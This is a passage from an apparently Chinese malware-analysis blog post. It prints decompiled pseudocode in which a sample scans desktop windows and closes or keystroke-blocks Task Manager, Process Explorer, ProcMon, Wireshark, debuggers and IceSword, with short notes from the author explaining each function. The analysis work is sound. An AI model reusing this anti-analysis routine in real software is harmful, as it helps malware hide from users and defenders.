FindWindowExA(hWndParent_1<span class="punctuation">,</span> hWndChildAfter<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    hWndParent_2 = FindWindowExA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="string">&quot;msctls_statusbar32&quot;</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    hWnd = FindWindowExA(hWndParent_2<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    GetWindowTextA(hWnd<span class="punctuation">,</span> String<span class="punctuation">,</span> <span class="number">101</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan = MapVirtualKeyA(<span class="number">0x11</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x11</span>u<span class="punctuation">,</span> bScan<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan_1 = MapVirtualKeyA(<span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x12</span>u<span class="punctuation">,</span> bScan_1<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan_2 = MapVirtualKeyA(<span class="number">0x44</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x44</span>u<span class="punctuation">,</span> bScan_2<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan_3 = MapVirtualKeyA(<span class="number">0x44</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x44</span>u<span class="punctuation">,</span> bScan_3<span class="punctuation">,</span> <span class="number">2</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan_4 = MapVirtualKeyA(<span class="number">0x11</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x11</span>u<span class="punctuation">,</span> bScan_4<span class="punctuation">,</span> <span class="number">2</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan_5 = MapVirtualKeyA(<span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x12</span>u<span class="punctuation">,</span> bScan_5<span class="punctuation">,</span> <span class="number">2</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      if ( FindWindowA(<span class="number">0</span><span class="punctuation">,</span> <span class="string">&quot;IceSword&quot;</span>) )</span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        bScan_6 = MapVirtualKeyA(<span class="number">0xD</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">        keybd_event(<span class="number">0xD</span>u<span class="punctuation">,</span> bScan_6<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">        bScan_7 = MapVirtualKeyA(<span class="number">0xD</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">        keybd_event(<span class="number">0xD</span>u<span class="punctuation">,</span> bScan_7<span class="punctuation">,</span> <span class="number">2</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  while ( hWndChildAfter );</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  __writefsdword(<span class="number">0</span><span class="punctuation">,</span> v14<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>);</span><br><span class="line">  return sub_403C68(&amp;loc_406BF8);</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub_4041B4() 字符串匹配函数，检测窗口标题是否包含：<span class="string">&quot;任务管理器&quot;</span></span><br><span class="line"><span class="string">&quot;Process Explorer&quot;</span></span><br><span class="line"><span class="string">&quot;ProcMon&quot;</span></span><br><span class="line"><span class="string">&quot;Wireshark&quot;</span></span><br><span class="line"><span class="string">&quot;调试器&quot;</span></span><br><span class="line"><span class="string">&quot;IceSword&quot;</span>（古老的著名内核工具，现在win10，<span class="number">11</span>都不用这个了）</span><br><span class="line">专门检测 IceSword 并模拟按键（简单来说就是不让你打开得得功能）</span><br></pre></td></tr></table></figure><p>sub_4060D4–Windows 异常处理（SEH）框架 + 资源枚举循环 的函数，用于枚举系统资源（如窗口、进程、文件、驱动）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line">int __stdcall sub_4062C8()</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  HWND hWndChildAfter; <span class="comment">// ebx</span></span><br><span class="line">  HWND hWndParent; <span class="comment">// edi</span></span><br><span class="line">  HWND hWndParent_1; <span class="comment">// edi</span></span><br><span class="line">  HWND hWndParent_2; <span class="comment">// eax</span></span><br><span class="line">  HWND hWnd; <span class="comment">// eax</span></span><br><span class="line">  BYTE bScan; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_1; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_2; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_3; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_4; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_5; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_6; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_7; <span class="comment">// al</span></span><br><span class="line">  unsigned int v14<span class="punctuation">[</span><span class="number">6</span><span class="punctuation">]</span>; <span class="comment">// [esp-Ch] [ebp-108h] BYREF</span></span><br><span class="line">  CHAR String<span class="punctuation">[</span><span class="number">101</span><span class="punctuation">]</span>; <span class="comment">// [esp+97h] [ebp-65h] BYREF</span></span><br><span class="line">  int savedregs; <span class="comment">// [esp+FCh] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v14<span class="punctuation">[</span><span class="number">2</span><span class="punctuation">]</span> = (unsigned int)&amp;savedregs;</span><br><span class="line">  v14<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span> = (unsigned int)&amp;loc_406BF1;</span><br><span class="line">  v14<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span> = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList;</span><br><span class="line">  __writefsdword(<span class="number">0</span><span class="punctuation">,</span> (unsigned int)v14);</span><br><span class="line">  sub_406218();</span><br><span class="line">  hWndChildAfter = <span class="number">0</span>;</span><br><span class="line">  hWndParent = GetDesktopWindow();</span><br><span class="line">  do</span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    hWndChildAfter = FindWindowExA(hWndParent<span class="punctuation">,</span> hWndChildAfter<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    GetWindowTextA(hWndChildAfter<span class="punctuation">,</span> String<span class="punctuation">,</span> <span class="number">101</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  while ( hWndChildAfter );</span><br><span class="line">  hWndParent_1 = GetDesktopWindow();</span><br><span class="line">  do</span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    hWndChildAfter = FindWindowExA(hWndParent_1<span class="punctuation">,</span> hWndChildAfter<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    hWndParent_2 = FindWindowExA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="string">&quot;msctls_statusbar32&quot;</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    hWnd = FindWindowExA(hWndParent_2<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    GetWindowTextA(hWnd<span class="punctuation">,</span> String<span class="punctuation">,</span> <span class="number">101</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan = MapVirtualKeyA(<span class="number">0x11</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x11</span>u<span class="punctuation">,</span> bScan<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan_1 = MapVirtualKeyA(<span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x12</span>u<span class="punctuation">,</span> bScan_1<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan_2 = MapVirtualKeyA(<span class="number">0x44</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x44</span>u<span class="punctuation">,</span> bScan_2<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan_3 = MapVirtualKeyA(<span class="number">0x44</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x44</span>u<span class="punctuation">,</span> bScan_3<span class="punctuation">,</span> <span class="number">2</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan_4 = MapVirtualKeyA(<span class="number">0x11</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x11</span>u<span class="punctuation">,</span> bScan_4<span class="punctuation">,</span> <span class="number">2</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      bScan_5 = MapVirtualKeyA(<span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      keybd_event(<span class="number">0x12</span>u<span class="punctuation">,</span> bScan_5<span class="punctuation">,</span> <span class="number">2</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      if ( FindWindowA(<span class="number">0</span><span class="punctuation">,</span> <span class="string">&quot;IceSword&quot;</span>) )</span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        bScan_6 = MapVirtualKeyA(<span class="number">0xD</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">        keybd_event(<span class="number">0xD</span>u<span class="punctuation">,</span> bScan_6<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">        bScan_7 = MapVirtualKeyA(<span class="number">0xD</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">        keybd_event(<span class="number">0xD</span>u<span class="punctuation">,</span> bScan_7<span class="punctuation">,</span> <span class="number">2</span>u<span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  while ( hWndChildAfter );</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  sub_4060D4();</span><br><span class="line">  __writefsdword(<span class="number">0</span><span class="punctuation">,</span> v14<span class="punctuation">[</span><span class="number">0</span><span 